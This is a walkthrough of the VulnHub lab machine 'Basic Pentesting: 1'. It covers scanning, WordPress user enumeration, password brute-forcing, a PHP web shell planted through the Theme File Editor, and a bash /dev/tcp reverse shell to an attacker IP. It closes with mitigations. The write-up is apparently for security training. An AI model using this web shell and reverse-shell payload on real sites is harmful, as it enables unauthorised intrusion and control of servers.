# Basic Pentesting: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Basic Pentesting: 1 |
| Platform | VulnHub |
| Difficulty | Easy |
| OS | Linux |

## 🔍 Overview

Basic Pentesting: 1 is a Linux machine involving directory brute-forcing to uncover a hidden WordPress installation, WordPress user enumeration and weak-credential brute-forcing, and remote code execution via the WordPress Theme File Editor to obtain an initial `www-data` shell.

**Machine Details**

- Target IP: `192.168.1.16`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Reconnaissance

```bash
nmap -sV -p- 192.168.1.16
```

**Open Ports:**

| Port | Service | Version |
|---|---|---|
| 21 | FTP | ProFTPD 1.3.3c |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

Web enumeration was prioritized since no anonymous FTP access or SSH credentials were known.

---

## Step 2 – Web Enumeration

```bash
gobuster dir -u http://192.168.1.16 -w /usr/share/wordlists/dirb/common.txt
```

**Found:** A hidden `/secret/` directory.

---

## Step 3 – WordPress Enumeration

Browsing to `/secret/` revealed a WordPress installation running **WordPress 4.9** — an outdated version with several known security issues.

---

## Step 4 – User Enumeration and Credential Discovery

**Enumerate valid users:**

```bash
wpscan --url http://192.168.1.16/secret/ -e u
```

**Found:** A valid `admin` user account.

**Password brute force:**

```bash
wpscan --url http://192.168.1.16/secret/ \
-U admin \
-P /usr/share/wordlists/dirb/others/best110.txt
```

**Result:** Weak, default administrator credentials were successfully identified — allowing access without exploiting any software vulnerability.

---

## Step 5 – WordPress Administration Access

Logged into the WordPress dashboard at `/secret/wp-login.php` using the recovered credentials, gaining administrative access.

---

## Step 6 – Remote Code Execution via Theme File Editor

Navigated to **Appearance → Theme File Editor** and modified the active theme's PHP file to insert a simple web shell:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

This payload accepts a `cmd` parameter via the URL and executes it using PHP's `system()` function.

---

## Step 7 – Verify Command Execution

```
http://192.168.1.16/secret/index.php?cmd=id
```

**Result:** Command output confirmed successful remote code execution as `www-data`.

---

## Step 8 – Obtain a Reverse Shell

**Set up a listener:**

```bash
nc -lvnp 4444
```

**Trigger a reverse shell via the web shell:**

```
http://192.168.1.16/secret/index.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.10/4444%200%3E%261'
```

**Result:** Reverse shell received as `www-data`.

**Upgraded to an interactive shell:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

✅ **Initial foothold obtained as `www-data`.**

---

## 🛡️ Key Vulnerabilities Identified

1. Hidden but discoverable directory exposing a WordPress installation
2. Outdated WordPress version (4.9) with known security weaknesses
3. WordPress username enumeration possible via WPScan
4. Weak, default administrator credentials (`admin`/`admin`)
5. WordPress Theme File Editor allowing arbitrary PHP code execution for any authenticated administrator

## 🩹 Mitigations

1. Avoid relying on "hidden" directory names as a security measure — enforce proper access controls instead
2. Keep WordPress core, themes, and plugins updated
3. Disable or restrict WordPress username enumeration
4. Enforce strong, non-default administrator credentials
5. Disable the Theme/Plugin File Editor in production WordPress installations, or restrict it via file system permissions
6. Implement a Web Application Firewall (WAF) to detect and block suspicious command-execution patterns

---

## 🧰 Tools Used

`nmap` · `gobuster` · `wpscan` · `netcat` · `python (pty)`

## 🧠 Techniques Covered

Network scanning · Directory brute-forcing · WordPress enumeration · Credential brute-forcing · WordPress Theme File Editor RCE · Reverse shell handling

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Reconnaissance | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | WordPress Enumeration | ✅ |
| 4 | User Enumeration & Credential Discovery | ✅ |
| 5 | WordPress Administration Access | ✅ |
| 6 | RCE via Theme File Editor | ✅ |
| 7 | Verify Command Execution | ✅ |
| 8 | Obtain Reverse Shell | ✅ |

**Note:** This write-up covers reconnaissance through initial foothold as `www-data`. Local enumeration and privilege escalation to user- and root-level access are not included here.

*Writeup for educational purposes. Machine solved as part of VulnHub CTF practice.*
